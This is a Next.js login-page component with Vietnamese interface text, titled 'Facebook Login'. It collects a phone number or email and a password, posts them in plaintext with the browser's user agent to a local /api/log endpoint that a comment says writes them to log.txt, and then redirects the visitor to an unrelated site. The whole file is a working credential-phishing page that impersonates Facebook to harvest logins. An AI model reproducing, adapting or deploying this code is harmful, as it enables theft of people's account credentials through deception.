import { useState } from "react";
import { useRouter } from "next/router";

export default function Login() {
  const [identifier, setIdentifier] = useState(""); // Dùng chung cho số điện thoại hoặc email
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const validateIdentifier = (input) => {
    const phoneRegex = /^\d{10}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return phoneRegex.test(input) || emailRegex.test(input);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setError("");

    if (!validateIdentifier(identifier)) {
      setError("Vui lòng nhập số điện thoại (10 chữ số) hoặc email hợp lệ.");
      return;
    }

    // Lấy thông tin user agent
    const userAgent = navigator.userAgent;

    // Gửi dữ liệu đến backend để lưu vào file log.txt
    fetch("/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identifier, password, userAgent })
    }).then(() => {
      // Chuyển hướng đến trang boitinhyeu.vn sau khi lưu file
      router.push("https://boitinhyeu.vn/");
    }).catch((err) => {
      console.error("Lỗi ghi log:", err);
    });
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-6 rounded-lg shadow-lg w-96">
        <h2 className="text-2xl font-bold text-center text-blue-600">Facebook Login</h2>
        {error && <p className="text-red-500 text-sm">{error}</p>}
        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Số điện thoại hoặc Email"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            className="w-full p-2 border rounded mt-2"
          />
          <input
            type="password"
            placeholder="Mật khẩu"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-2 border rounded mt-2"
          />
          <button type="submit" className="w-full bg-blue-600 text-white p-2 rounded mt-4">Đăng nhập</button>
        </form>
      </div>
    </div>
  );
}